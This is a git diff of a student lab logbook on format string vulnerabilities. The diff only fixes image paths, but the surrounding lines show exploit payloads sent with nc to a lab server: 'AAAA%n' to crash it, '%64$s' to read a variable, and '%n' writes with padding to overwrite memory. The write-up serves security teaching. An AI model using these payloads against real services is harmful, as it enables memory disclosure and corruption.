@@ -40,7 +40,7 @@ with the command:
 $ echo hello | nc 10.9.0.5 9090
 ```
 result:
-![Alt text](images\logbook7\task1-benign.png)
+![Alt text](images/logbook7/task1-benign.png)
 
 We then were asked to crash the program which we achieved using the following input:
 
@@ -49,14 +49,14 @@ AAAA%n
 ```
 This writes 4 to the address 0x41414141 which isn't a valid memory address, whcich ends up crashing the program
 
-![Alt text](images\logbook7\task1-crash.png)
+![Alt text](images/logbook7/task1-crash.png)
 
 
 ## Task 2 a
 
 We concluded we need 64 %x to get the server to start printing the beggining of the user input, we checked this by sending AAAA as the 4 first bytes in our input followed by 64 %x.
 
-![Alt text](images\logbook7\task2-a.png)
+![Alt text](images/logbook7/task2-a.png)
 
 ## Task 2 b
 
@@ -67,7 +67,7 @@ To do so, we wrote the address of the variable in little endian followed by %64$
 content = (0x080b4008).to_bytes(4,byteorder='little') + b"%64$s"
 ```
 
-![Alt text](images\logbook7\task2-b.png)
+![Alt text](images/logbook7/task2-b.png)
 
 
 ## Task 3 a
@@ -78,7 +78,7 @@ To change the value of a variable using a format string vulnerabilities we need 
 content = (0x080e5068).to_bytes(4,byteorder='little') + b"%64$n"
 ```
 
-![Alt text](images\logbook7\task3-a.png)
+![Alt text](images/logbook7/task3-a.png)
 
 ## Task 3 b
 
@@ -89,7 +89,7 @@ These amount of characters is enough because we've already written 4 characters 
 content = (0x080e5068).to_bytes(4,byteorder='little') +b"%20476x" + b"%64$n"
 ```
 
-![Alt text](images\logbook7\task3-b.png)
+![Alt text](images/logbook7/task3-b.png)
 
 
 
